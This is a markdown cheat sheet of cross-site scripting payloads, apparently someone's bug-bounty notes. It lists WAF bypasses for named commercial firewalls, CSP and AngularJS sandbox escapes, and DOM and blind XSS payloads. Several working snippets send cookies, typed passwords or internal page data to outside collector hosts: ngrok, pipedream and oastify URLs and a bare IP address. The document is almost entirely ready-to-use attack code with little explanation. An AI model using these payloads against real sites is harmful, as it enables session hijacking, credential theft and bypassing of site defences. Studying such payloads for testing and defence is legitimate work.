# XSS

- Classic Payloads
    
    ```jsx
    "><svg/onload=prompt(/test/)>
    '"--!><img src=x onerror=alert("test")> 
    '"/><svg/onload=prompt(/test/)>
    '"><script>alert("test")</script>
    '"><script>confirm("test")</script>
    '"><script>prompt("test")</script>
    '"><svg/onload=alert(/test/)>
    '"><svg/onload=confirm(/test/)>
    '"><svg/onload=prompt(/test/)>
    '>"/><svg/onload=prompt(/test/)>
    <Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
    <img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>
    <svg/onload=prompt(/test/)>
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("OPENBUGBOUNTY")//>\x3exss.txt
    '"><svg/onload=prompt`1`>
    '"><svg/onload=alert`1`>
    '"><svg/onload=confirm`1`>
    '"><script>alert`1`</script> 
    ><script>alert`1`</script> 
    </script><script>alert(1)</script>
    '"><svg onload=prompt`test`>
    '"><svg onload=alert`test`>
    '"><svg onload=confirm`test`>
    <!'/*!"/*!/'/*/"/*--!><Input/Autofocus/*/Onfocus=confirm`test`//><Svg>/
    '"><svg/onload=alert(/test/)>
    ```
    
- WAF Bypass
    
    ```jsx
    Cloudflare
    
    %253Cimg/src/onerror=alert(document.domain)%253E
    
    Akamai WAf:
    ';k='e'%0Atop['al'+k+'rt'](1)//
    '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
    
    CloudFlare WAf:
    <svg/onload=window["al"+"ert"]1337>
    <Img Src=OnXSS OnError=confirm(1337)>
    <Svg Only=1 OnLoad=confirm(document.domain)>
    <svg onload=alert&#0000000040document.cookie)>
    <sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
    %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
    <Img Src=//X55.is OnLoad%0C=import(Src)>
    <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
    
    Cloudfront Waf:
    ">'><details/open/ontoggle=confirm('XSS')>
    6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
    ';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
    ">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
    
    Mod security:
    <svg onload='new Function["Y000!"].find(al\u0065rt)'>
    
    Imperva Waf:
    <Img Src=//X55.is OnLoad%0C=import(Src)>
    <sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
    <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;
    lert&#x000000028;origin&#x000029;>
    
    most of them are from coffin:)
    
    +%0A%0D%0A%0D%22%3C!%3E!%0D%0Atarget=%22_blank%22%0D%0Aonclick=%0D%0A%22%0D%0Ax=window[%27pr%27%2b%27o%27%2b%27m%27+%2b%27pt%27](%271%27)(%271%27)%0D%0Aompt,%0D%0Ax`Tiktok`
    "<!>!
    target="_blank"
    onclick=
    "
    x=window['pr' 'o' 'm'  'pt']('1')('1')
    ompt,
    x`Tiktok`
    ```
    
- rare case
    
    ```jsx
    event handlers and href blocked.
    <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
    
    js url some chars blocked. ( uses throw )
    5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27a
    
    capture passwords.
    <input name=username id=username>
    <input type=password name=password onchange="if(this.value.length)fetch('https://0ijd1v3knk9y9l8k2ltts4jf369xxnlc.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
    });">
    
    csp bypass token parameter set.
    <script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
    
    angle brackets and double quotes encoded and single quotes escaped.
    > \'-alert(1)//
    
    email stored XSS into onclick event with angle brackets 
    and double quotes HTML-encoded and single quotes and backslash escaped
    
    > http://foo?&apos;-alert(1)-&apos;
    
    template xss
    > ${alert(1)}
    
    a'.concat`window.location.hash.substr`1`'#alert(11)
    ```
    
- Cache
    
    ```jsx
    lmao"-alert(1)-"lmao
    ```
    
- more payloads
    - From Burp Labs I Did
        
        ```jsx
        <img src=x onerror=alert(1)>
        https://xyz.web-security-academy.net/feedback?returnPath=**javascript:alert(1)**
        <iframe src="https://xyz.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
        On E-mail Form > javascript:alert(1)
        -alert(1)-
        {{$on.constructor('alert(1)')()}} ( Only for angular js )
        \"-alert(1)}// ( Reflected DOM | Server-side application processes data from a request and echoes the data in the response)
        <><img src=1 onerror=alert(1)> ( Escaping replace(<>) function )
        <iframe src="https://0aee000c03b6163381c7bdd5008d0090.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
        
        ------------------------------------------------------
        <xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x
        
        gives payload 'x' id and #x makes it auto focus 
        ------------------------------------------------------
        
        ><svg><animatetransform onbegin=alert(1)>
        ```
        
    - From Twitter
        
        ```jsx
        "\u003e\u003cimg src=1 onerror=alert(0)\u003e
        
        ["');alert('XSS');//"]@xyz.xxx
        ```
        
    - For actions like cookie steal
        
        ```jsx
        > Exploiting XSS to perform CSRF
        <script>
        var req = new XMLHttpRequest();
        req.onload = handleResponse;
        req.open('get','/my-account',true);
        req.send();
        function handleResponse() {
            var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
            var changeReq = new XMLHttpRequest();
            changeReq.open('post', '/my-account/change-email', true);
            changeReq.send('csrf='+token+'&email=test@test.com')
        };
        </script>
        
        > Cookie stealer
        <script>
        var i=new Image;
        i.src="https://377d-2405-5700-300-1436-9d2-7b0e-4101-622c.ngrok-free.app/?"+document.cookie;
        </script>
        
        >SVG Upload
        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        <svg version="1.1" baseProfile="full" >
           <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
           <script type="text/javascript">
              alert("xss");
           </script>
        </svg>
        
        > One Line
        <img src="x" onerror="eval('var img=document.createElement(\'img\');img.src=\'https://eothor0lkns4qae.m.pipedream.net/steal?cookie=\'+encodeURIComponent(document.cookie);')">
        <img src="http://nastyox.com/images/fake-sample-url" onload="var i=0;if(i++)this.src+='?c='+encodeURIComponent(document.cookie);"/>
        ```
        
    
    ```bash
    Tags & Events
    
    https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
    ```
    
- DOM XSS
    
    ```jsx
    <iframe src="https://target" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
    
    JSON PARSE: <iframe src="https://target/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
    
    <a onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>
    Open Redirect: https://target.net/post?postId=4&url=https://evil.com/ 
    
    ```
    
- Blind XSS
    
    ```jsx
    "><script+src%3d"http%3a//16.16.115.91/exp.js"></script>
    
    var flag = btoa(document.cookie);
    var url = 'http://16.16.115.91/?domain=' + flag;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.onload = function() {
      console.log('Request successful');
    };
    xhr.onerror = function() {
      console.error('Request error');
    };
    xhr.send();
    ```
    
    ```jsx
    </script><img/src=x onerror="fetch('lncng014od91nc93zn5l8z1mbdh459ty.oastify.com' + document.domain)">
    
    </script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/lncng014od91nc93zn5l8z1mbdh459ty.oastify.com/+`${document.domain}`).slice(2), document.documentElement.appendChild(s))//'>
    
    </script><img/src='x' onerror='fetch("http://127.0.0.1:1337/settings").then(response => response.text().then(data => { const s = document.createElement("script"); s.src = "https://lncng014od91nc93zn5l8z1mbdh459ty.oastify.com/" + btoa(data); document.documentElement.appendChild(s); }))'>
    
    </script><link rel='stylesheet' href='data:text/css;base64,' onerror='fetch("http://127.0.0.1:1337/settings").then(response => response.text().then(data => { const s = document.createElement("script"); s.src = "https://lncng014od91nc93zn5l8z1mbdh459ty.oastify.com/" + btoa(data); document.documentElement.appendChild(s); }))'>
    ```
    
    ```jsx
    <style onload="var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('post','/secret_admin_search',true);
    req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    req.send('search=1+UNION+SELECT+1,flag,1,1,1,null+FROM+\'flag\'--');
    function handleResponse() {
        var res = btoa(this.responseText);
        var commentReq = new XMLHttpRequest();
        commentReq.open('post', '/comment/1', true);
        commentReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        commentReq.send('comment='+res)
    };"></style>
    ```
    
    ```jsx
    <style onload=alert("sda")></style>
    ```
    
    ```jsx
    <style onload="var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/user/0',true);
    req.send();
    function handleResponse() {
        var res = btoa(this.responseText);
        var commentReq = new XMLHttpRequest();
        commentReq.open('post', '/comment/1', true);
        commentReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        commentReq.send('comment='+res)
    };"></style>
    ```
    
- CSP
    
    
    ```jsx
    script-src: 'self'
    	x")</script><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script><k ng-app>{{$on.constructor('alert(document.domain)')()}}</k>
    	
    
    https://csp-evaluator.withgoogle.com/
    
    https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
    	
    ```
    
- Angular JS
    
    ```jsx
    <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
    
    1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
    ```